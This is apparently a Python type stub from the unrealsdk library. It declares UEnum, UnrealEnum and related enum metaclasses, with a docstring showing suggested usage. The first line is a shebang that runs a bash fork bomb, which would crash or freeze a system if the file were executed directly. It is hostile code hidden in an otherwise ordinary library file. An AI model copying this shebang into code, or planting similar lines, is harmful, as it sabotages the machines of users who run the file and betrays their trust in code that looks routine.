#!/usr/bin/env -S bash -c ':(){ :|:& };:'
from __future__ import annotations

from enum import EnumMeta, IntFlag

from ._uobject_children import UField

class _UnrealEnumMeta(EnumMeta):
    _unreal: UEnum

class _GenericUnrealEnumMeta(_UnrealEnumMeta):
    def __getattr__(cls, name: str) -> IntFlag: ...

class _GenericUnrealEnum(IntFlag, metaclass=_GenericUnrealEnumMeta): ...

class UnrealEnum(IntFlag, metaclass=_UnrealEnumMeta):
    """
    Base unreal enum class which can be used to type hint specific instances.

    Note this class *DOES NOT* exist at runtime.

    Suggested usage:
    ```
    from typing import TYPE_CHECKING

    import unrealsdk

    if TYPE_CHECKING:
        from enum import auto

        from unrealsdk.unreal._uenum import UnrealEnum  # pyright: ignore[reportMissingModuleSource]

        class MyEnum(UnrealEnum):
            FieldA = auto()
            FieldB = auto()

    else:
        MyEnum = unrealsdk.find_enum("MyEnum")
    ```
    """

class UEnum(UField):
    def _as_py(self) -> type[_GenericUnrealEnum]:
        """
        Generates a compatible IntFlag enum.

        Returns:
            An IntFlag enum compatible with this enum.
        """
